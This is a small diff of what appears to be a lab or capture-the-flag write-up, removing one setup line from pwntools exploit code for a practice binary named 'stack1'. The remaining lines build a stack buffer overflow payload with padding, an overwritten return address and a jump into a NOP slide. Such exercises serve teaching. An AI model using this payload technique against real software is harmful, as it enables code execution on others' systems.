@@ -89,7 +89,6 @@ p.interactive()
 
 ```python
 from pwn import *
-elf = context.binary = ELF('./stack1')
 
 padding = b"a"*64+p32(0x08048477)+b"a"*12
 eip = p32(0xffffd250+100) # esp addr + offset nop_slide
